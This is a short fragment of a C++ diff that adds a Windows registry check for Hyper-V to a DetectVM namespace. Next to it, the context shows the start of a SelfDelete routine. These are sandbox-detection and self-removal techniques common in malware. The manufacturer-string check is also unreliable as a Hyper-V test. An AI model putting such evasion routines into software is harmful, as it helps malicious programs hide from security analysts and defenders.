@@ -17,6 +17,24 @@ namespace DetectVM {
         return false;
     }
 
+    bool IsMsHyperV() {
+        HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);
+
+        //Check registry for system manufacturer
+        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
+        {
+            LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemManufacturer"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
+            if (result == ERROR_SUCCESS)
+            {
+                if (strcmp(buf, "Microsoft Corporation") == 0)
+                    return true;
+            }
+        }
+
+
+        return false;
+    }
+
     BOOL SelfDelete(){
         TCHAR szFile[MAX_PATH], szCmd[MAX_PATH];
         if((GetModuleFileName(0,szFile,MAX_PATH)!=0) &&(GetShortPathName(szFile,szFile,MAX_PATH)!=0)){
